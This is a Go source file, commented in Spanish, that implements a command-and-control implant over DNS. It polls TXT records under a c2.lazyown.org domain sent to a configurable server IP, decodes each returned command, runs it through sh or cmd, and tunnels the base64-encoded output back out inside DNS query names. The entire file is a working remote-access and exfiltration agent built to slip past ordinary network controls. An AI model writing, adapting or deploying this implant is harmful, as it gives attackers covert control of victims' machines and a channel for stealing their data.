package main

import (
    "context" // Importar el paquete context
    "encoding/base64"
    "fmt"
    "net"
    "os/exec"
    "runtime"
    "time"
)

const (
    C2_IP     = "127.0.0.1" // Cambia esto por la IP del servidor DNS
    SLEEP     = 6 * time.Second
)

func main() {
    for {
        // Obtener un comando del servidor DNS
        command := getCommand()
        if command != "" {
            fmt.Printf("[*] Comando recibido: %s\n", command)

            // Ejecutar el comando
            output := executeCommand(command)
            fmt.Printf("[*] Salida del comando: %s\n", output)

            // Enviar la salida al servidor DNS
            sendOutput(output)
        }

        time.Sleep(SLEEP)
    }
}

func getCommand() string {
    // Codificar sin relleno y usar URL-safe
    request := base64.RawURLEncoding.EncodeToString([]byte("get_command"))
    query := fmt.Sprintf("%s.c2.lazyown.org.", request) // Añade el punto final
    // Realizar una consulta DNS TXT directamente a la IP del servidor DNS
    resolver := &net.Resolver{
        PreferGo: true,
        Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
            d := net.Dialer{}
            return d.DialContext(ctx, "udp", C2_IP+":53")
        },
    }

    txtRecords, err := resolver.LookupTXT(context.Background(), query)
    if err != nil {
        fmt.Printf("[ERROR] Error en la consulta DNS: %v\n", err)
        return ""
    }

    // Decodificar el comando desde la respuesta
    if len(txtRecords) > 0 {
        command, err := base64.StdEncoding.DecodeString(txtRecords[0])
        if err != nil {
            fmt.Printf("[ERROR] Error decodificando el comando: %v\n", err)
            return ""
        }
        return string(command)
    }

    return ""
}

func executeCommand(command string) string {
    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd", "/C", command)
    } else {
        cmd = exec.Command("sh", "-c", command)
    }

    output, err := cmd.CombinedOutput()
    if err != nil {
        return fmt.Sprintf("Error: %v", err)
    }
    return string(output)
}

func sendOutput(output string) {
    // Codificar la salida en base64
    encodedOutput := base64.StdEncoding.EncodeToString([]byte(output))
    query := fmt.Sprintf("%s.%s", encodedOutput, "c2.lazyown.org.")

    // Enviar la salida a través de una consulta DNS TXT directamente a la IP del servidor DNS
    resolver := &net.Resolver{
        PreferGo: true,
        Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
            d := net.Dialer{}
            return d.DialContext(ctx, "udp", C2_IP+":53")
        },
    }

    _, err := resolver.LookupTXT(context.Background(), query)
    if err != nil {
        fmt.Printf("[ERROR] Error enviando salida: %v\n", err)
    }
}